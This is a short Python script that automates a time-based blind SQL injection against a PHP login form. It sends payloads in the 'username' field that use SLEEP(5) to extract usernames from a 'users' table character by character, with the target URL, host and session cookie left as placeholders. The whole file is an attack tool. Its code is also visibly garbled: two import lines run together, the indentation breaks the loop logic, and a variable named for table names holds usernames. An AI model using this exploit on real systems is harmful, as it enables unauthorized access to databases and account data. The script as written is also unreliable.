import requests
import timeurl = "http://<REPLACE>"
characters = "abcdefghijklmnopqrstuvwxyz0123456789_"
success_time = 3
table_name = ""
position = 1
offset_position = 0
headers = {
    "Host": "<HOST>",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://<REPLACE>",
    "Connection": "keep-alive",
    "Referer": "http://<REPLACE>",
    "Cookie": "PHPSESSID=<COOKIE>",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
}
while True:
    found_char = False
    for char in characters:
        payload = f"admin' AND (SELECT IF(SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET {offset_position}),{position},1)='{char}',SLEEP(5),0)) AND 'iWcA'='iWcA" #May need to replace with payload suited for SQL vulnerablilty
        start_time = time.time()
        response = requests.post(url, headers=headers, data={"username": payload})
        elapsed_time = time.time() - start_time
    if elapsed_time > success_time:
            table_name += char
            print(f"found character: {char}")
            found_char = True
            break
    if not found_char:
        print(f"Table name: {table_name}")
        print(f"Offset param: {offset_position}")
        table_name = ""
        position = 1
        offset_position += 1
        continue

position += 1
